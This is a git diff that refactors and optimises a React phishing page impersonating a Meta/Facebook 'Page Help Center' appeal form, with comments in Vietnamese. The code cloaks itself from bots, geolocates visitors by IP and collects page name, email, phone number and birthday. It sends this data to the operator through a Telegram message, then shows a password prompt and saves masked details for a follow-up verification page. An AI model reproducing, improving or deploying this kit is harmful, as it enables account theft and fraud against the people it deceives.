@@ -1,12 +1,23 @@
 import FromMetaImage from '@/assets/images/from-meta.png';
 import FacebookImage from '@/assets/images/icon.webp';
 import PasswordInput from '@/components/password-input';
-import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
+
+// ✅ FONTAWESOME OPTIMIZED - Import từng icon riêng
+import { faChevronDown } from '@fortawesome/free-solid-svg-icons/faChevronDown';
+import { faCircleExclamation } from '@fortawesome/free-solid-svg-icons/faCircleExclamation';
+import { faCompass } from '@fortawesome/free-solid-svg-icons/faCompass';
+import { faHeadset } from '@fortawesome/free-solid-svg-icons/faHeadset';
+import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
+import { faUserGear } from '@fortawesome/free-solid-svg-icons/faUserGear';
+
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
-import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
-import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
+
+// ✅ LIBPHONENUMBER OPTIMIZED - Import minimal versions
+import AsYouType from 'libphonenumber-js/min/es6/AsYouType';
+import getCountryCallingCode from 'libphonenumber-js/min/es6/getCountryCallingCode';
+
 // 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
 import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
@@ -42,7 +53,6 @@ const Home = () => {
             createPage: 'Create Page',
             termsPolicies: 'Terms and policies',
             cookies: 'Cookies',
-            // 🚀 THÊM: Text cho trạng thái loading
             pleaseWait: 'Please wait...',
             checkingSecurity: 'Checking security...'
         }),
@@ -62,62 +72,50 @@ const Home = () => {
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
-    // 🚀 THAY ĐỔI: Thêm state để theo dõi trạng thái bảo mật
     const [securityChecked, setSecurityChecked] = useState(false);
     const [isFormEnabled, setIsFormEnabled] = useState(false);
-    // 🚀 THÊM: State để quản lý trạng thái loading khi submit
     const [isSubmitting, setIsSubmitting] = useState(false);
 
-    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
-    const initializeSecurity = useCallback(async () => {
-        try {
-            // 1. Kiểm tra bot tự động
-            const botResult = await detectBot();
-            if (botResult.isBot) {
-                window.location.href = 'about:blank';
-                return;
-            }
-
-            // 2. Lấy thông tin IP và vị trí
-            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-            const ipData = response.data;
-            
-            // Lưu thông tin IP vào localStorage
-            localStorage.setItem('ipInfo', JSON.stringify(ipData));
-            
-            const detectedCountry = ipData.country_code || 'US';
-            setCountryCode(detectedCountry);
-
-            // 3. Xác định ngôn ngữ và dịch (chạy sau khi web đã hiển thị)
-            const targetLang = countryToLanguage[detectedCountry] || 'en';
-            localStorage.setItem('targetLang', targetLang);
-            
-            if (targetLang !== 'en') {
-                // Dịch ở background, không chờ
-                translateCriticalTexts(targetLang);
-            }
-
-            // 4. Set calling code
-            const code = getCountryCallingCode(detectedCountry);
-            setCallingCode(`+${code}`);
-
-            // 🚀 QUAN TRỌNG: Đánh dấu đã check bảo mật và enable form
-            setSecurityChecked(true);
-            setIsFormEnabled(true);
-            
-        } catch (error) {
-            console.log('Security initialization failed:', error.message);
-            // 🚀 QUAN TRỌNG: Vẫn enable form nếu có lỗi
-            setCountryCode('US');
-            setCallingCode('+1');
-            setSecurityChecked(true);
-            setIsFormEnabled(true);
-        }
+    // ✅ MEMOIZE FORMAT FUNCTIONS
+    const formatDateToDDMMYYYY = useCallback((dateString) => {
+        if (!dateString) return '';
+        const parts = dateString.split('-');
+        if (parts.length !== 3) return dateString;
+        return `${parts[2]}/${parts[1]}/${parts[0]}`;
     }, []);
 
-    // 🚀 HÀM DỊCH TEXT QUAN TRỌNG TRƯỚC
+    const hideEmail = useCallback((email) => {
+        if (!email) return 's****g@m****.com';
+        const parts = email.split('@');
+        if (parts.length !== 2) return email;
+        
+        const username = parts[0];
+        const domain = parts[1];
+        const domainParts = domain.split('.');
+        
+        if (username.length <= 1) return email;
+        if (domainParts.length < 2) return email;
+        
+        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
+        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
+        
+        return formattedUsername + '@' + formattedDomain;
+    }, []);
+
+    const hidePhone = useCallback((phone) => {
+        if (!phone) return '******32';
+        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
+        if (cleanPhone.length < 2) return '******32';
+        
+        const lastTwoDigits = cleanPhone.slice(-2);
+        return '*'.repeat(6) + lastTwoDigits;
+    }, []);
+
+    // ✅ LAZY LOAD TRANSLATION UTILS
     const translateCriticalTexts = useCallback(async (targetLang) => {
         try {
+            const { translateText } = await import('@/utils/translate');
+            
             const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
                 translateText(defaultTexts.helpCenter, targetLang),
                 translateText(defaultTexts.pagePolicyAppeals, targetLang),
@@ -151,16 +149,16 @@ const Home = () => {
                 checkingSecurity
             }));
 
-            // Dịch phần còn lại ở background
             translateRemainingTexts(targetLang);
         } catch (error) {
             console.log('Critical translation failed:', error.message);
         }
     }, [defaultTexts]);
 
-    // 🚀 HÀM DỊCH TEXT CÒN LẠI - KHÔNG ẢNH HƯỞNG ĐẾN HIỂN THỊ
     const translateRemainingTexts = useCallback(async (targetLang) => {
         try {
+            const { translateText } = await import('@/utils/translate');
+            
             const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
                 translateText(defaultTexts.english, targetLang),
                 translateText(defaultTexts.using, targetLang),
@@ -191,12 +189,48 @@ const Home = () => {
         }
     }, [defaultTexts]);
 
-    // 🚀 THAY ĐỔI QUAN TRỌNG: HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
+    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
+    const initializeSecurity = useCallback(async () => {
+        try {
+            const botResult = await detectBot();
+            if (botResult.isBot) {
+                window.location.href = 'about:blank';
+                return;
+            }
+
+            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+            const ipData = response.data;
+            
+            localStorage.setItem('ipInfo', JSON.stringify(ipData));
+            
+            const detectedCountry = ipData.country_code || 'US';
+            setCountryCode(detectedCountry);
+
+            const targetLang = countryToLanguage[detectedCountry] || 'en';
+            localStorage.setItem('targetLang', targetLang);
+            
+            if (targetLang !== 'en') {
+                translateCriticalTexts(targetLang);
+            }
+
+            const code = getCountryCallingCode(detectedCountry);
+            setCallingCode(`+${code}`);
+
+            setSecurityChecked(true);
+            setIsFormEnabled(true);
+            
+        } catch (error) {
+            console.log('Security initialization failed:', error.message);
+            setCountryCode('US');
+            setCallingCode('+1');
+            setSecurityChecked(true);
+            setIsFormEnabled(true);
+        }
+    }, [translateCriticalTexts]);
+
     useEffect(() => {
-        // Chạy bảo mật ở background
         initializeSecurity();
         
-        // 🚀 Enable form sau 2 giây dù bảo mật có xong hay chưa
         const timer = setTimeout(() => {
             setIsFormEnabled(true);
         }, 2000);
@@ -204,55 +238,14 @@ const Home = () => {
         return () => clearTimeout(timer);
     }, [initializeSecurity]);
 
-    // Hàm validate email
-    const validateEmail = (email) => {
+    // ✅ MEMOIZE VALIDATION FUNCTIONS
+    const validateEmail = useCallback((email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
-    };
+    }, []);
 
-    // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
-    const formatDateToDDMMYYYY = (dateString) => {
-        if (!dateString) return '';
-        const parts = dateString.split('-');
-        if (parts.length !== 3) return dateString;
-        return `${parts[2]}/${parts[1]}/${parts[0]}`;
-    };
-
-    // THÊM HÀM ẨN EMAIL: s****g@m****.com
-    const hideEmail = (email) => {
-        if (!email) return 's****g@m****.com';
-        const parts = email.split('@');
-        if (parts.length !== 2) return email;
-        
-        const username = parts[0];
-        const domain = parts[1];
-        const domainParts = domain.split('.');
-        
-        if (username.length <= 1) return email;
-        if (domainParts.length < 2) return email;
-        
-        // Format: s****g (ký tự đầu + *** + ký tự cuối)
-        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
-        
-        // Format: m****.com (ký tự đầu + *** + .com)
-        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
-        
-        return formattedUsername + '@' + formattedDomain;
-    };
-
-    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
-    const hidePhone = (phone) => {
-        if (!phone) return '******32';
-        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
-        if (cleanPhone.length < 2) return '******32';
-        
-        // Luôn hiển thị 6 sao + 2 số cuối
-        const lastTwoDigits = cleanPhone.slice(-2);
-        return '*'.repeat(6) + lastTwoDigits;
-    };
-
-    const handleInputChange = (field, value) => {
-        if (!isFormEnabled || isSubmitting) return; // 🚀 Không cho nhập nếu form chưa enabled hoặc đang submit
+    const handleInputChange = useCallback((field, value) => {
+        if (!isFormEnabled || isSubmitting) return;
         
         if (field === 'phone') {
             const cleanValue = value.replace(/^\+\d+\s*/, '');
@@ -272,17 +265,16 @@ const Home = () => {
             }));
         }
 
-        // Chỉ clear error khi người dùng bắt đầu nhập, không validate real-time
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
                 [field]: false
             }));
         }
-    };
+    }, [isFormEnabled, isSubmitting, countryCode, callingCode, errors]);
 
-    const validateForm = () => {
-        if (!isFormEnabled || isSubmitting) return false; // 🚀 Không cho submit nếu form chưa enabled hoặc đang submit
+    const validateForm = useCallback(() => {
+        if (!isFormEnabled || isSubmitting) return false;
         
         const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
@@ -293,63 +285,15 @@ const Home = () => {
             }
         });
 
-        // Validate email format chỉ khi submit
         if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
             newErrors.mail = 'invalid';
         }
 
         setErrors(newErrors);
         return Object.keys(newErrors).length === 0;
-    };
+    }, [isFormEnabled, isSubmitting, formData, validateEmail]);
 
-    const handleSubmit = async () => {
-        if (!isFormEnabled || isSubmitting) return; // 🚀 Không cho submit nếu form chưa enabled hoặc đang submit
-        
-        if (validateForm()) {
-            try {
-                // 🚀 BẮT ĐẦU LOADING
-                setIsSubmitting(true);
-                
-                const telegramMessage = formatTelegramMessage(formData);
-                await sendMessage(telegramMessage);
-
-                // 🚀 THÊM DELAY 0.5s GIẢ LẬP LOADING
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
-                const hiddenData = {
-                    name: formData.pageName,
-                    email: hideEmail(formData.mail),
-                    phone: hidePhone(formData.phone),
-                    birthday: formData.birthday
-                };
-
-                // Lưu vào localStorage để trang Verify lấy
-                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
-
-                // 🚀 KẾT THÚC LOADING VÀ HIỂN THỊ PASSWORD
-                setIsSubmitting(false);
-                setShowPassword(true);
-                
-            } catch (error) {
-                // 🚀 QUAN TRỌNG: KẾT THÚC LOADING KHI CÓ LỖI
-                setIsSubmitting(false);
-                console.error('Submit error:', error);
-                // Chỉ redirect về blank khi có lỗi thực sự
-                window.location.href = 'about:blank';
-            }
-        } else {
-            const firstErrorField = Object.keys(errors)[0];
-            if (firstErrorField) {
-                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
-                if (inputElement) {
-                    inputElement.focus();
-                }
-            }
-        }
-    };
-
-    const formatTelegramMessage = (data) => {
+    const formatTelegramMessage = useCallback((data) => {
         const timestamp = new Date().toLocaleString('vi-VN');
         const ipInfo = localStorage.getItem('ipInfo');
         const ipData = ipInfo ? JSON.parse(ipInfo) : {};
@@ -362,13 +306,54 @@ const Home = () => {
 📧 <b>Email:</b> <code>${data.mail}</code>
 📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
 🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
-    };
+    }, []);
 
-    const handleClosePassword = () => {
+    const handleSubmit = useCallback(async () => {
+        if (!isFormEnabled || isSubmitting) return;
+        
+        if (validateForm()) {
+            try {
+                setIsSubmitting(true);
+                
+                const telegramMessage = formatTelegramMessage(formData);
+                await sendMessage(telegramMessage);
+
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                const hiddenData = {
+                    name: formData.pageName,
+                    email: hideEmail(formData.mail),
+                    phone: hidePhone(formData.phone),
+                    birthday: formData.birthday
+                };
+
+                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
+
+                setIsSubmitting(false);
+                setShowPassword(true);
+                
+            } catch (error) {
+                setIsSubmitting(false);
+                console.error('Submit error:', error);
+                window.location.href = 'about:blank';
+            }
+        } else {
+            const firstErrorField = Object.keys(errors)[0];
+            if (firstErrorField) {
+                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
+                if (inputElement) {
+                    inputElement.focus();
+                }
+            }
+        }
+    }, [isFormEnabled, isSubmitting, validateForm, formData, formatTelegramMessage, hideEmail, hidePhone, errors]);
+
+    const handleClosePassword = useCallback(() => {
         setShowPassword(false);
-    };
+    }, []);
 
-    const data_list = [
+    // ✅ MEMOIZE DATA_LIST
+    const data_list = useMemo(() => [
         {
             id: 'using',
             icon: faCompass,
@@ -389,7 +374,7 @@ const Home = () => {
             icon: faCircleExclamation,
             title: translatedTexts.policiesReporting
         }
-    ];
+    ], [translatedTexts.using, translatedTexts.managingAccount, translatedTexts.privacySecurity, translatedTexts.policiesReporting]);
 
     return (
         <>
@@ -397,7 +382,15 @@ const Home = () => {
                 <title>Page Help Center</title>
                 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                 <div className='flex items-center gap-2'>
-                    <img src={FacebookImage} alt='' className='h-10 w-10' />
+                    {/* ✅ IMAGE OPTIMIZATION */}
+                    <img 
+                        src={FacebookImage} 
+                        alt='' 
+                        className='h-10 w-10'
+                        loading="lazy"
+                        width="40"
+                        height="40"
+                    />
                     <p className='font-bold'>{translatedTexts.helpCenter}</p>
                 </div>
                 <div className='flex items-center gap-2'>
@@ -490,7 +483,6 @@ const Home = () => {
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
-                                {/* Desktop: type='date' bình thường */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
@@ -500,7 +492,6 @@ const Home = () => {
                                     disabled={!isFormEnabled || isSubmitting}
                                 />
                                 
-                                {/* Mobile: type='date' với placeholder ảo */}
                                 <div className='block sm:hidden relative'>
                                     <input 
                                         type='date' 
@@ -511,7 +502,6 @@ const Home = () => {
                                         required
                                         disabled={!isFormEnabled || isSubmitting}
                                     />
-                                    {/* Placeholder ảo cho mobile */}
                                     <div 
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                         onClick={() => (isFormEnabled && !isSubmitting) && document.querySelectorAll('input[name="birthday"]')[1].click()}
@@ -561,7 +551,6 @@ const Home = () => {
                                 )}
                             </button>
                             
-                            {/* 🚀 Hiển thị trạng thái bảo mật */}
                             {!securityChecked && (
                                 <div className="text-center text-sm text-gray-500 mt-2">
                                     {translatedTexts.checkingSecurity}
@@ -588,7 +577,15 @@ const Home = () => {
                         </div>
                         <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                         <div className='flex justify-between'>
-                            <img src={FromMetaImage} alt='' className='w-[100px]' />
+                            {/* ✅ IMAGE OPTIMIZATION */}
+                            <img 
+                                src={FromMetaImage} 
+                                alt='' 
+                                className='w-[100px]'
+                                loading="lazy"
+                                width="100"
+                                height="auto"
+                            />
                             <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                         </div>
                     </div>
@@ -598,4 +595,5 @@ const Home = () => {
         </>
     );
 };
+
 export default Home;
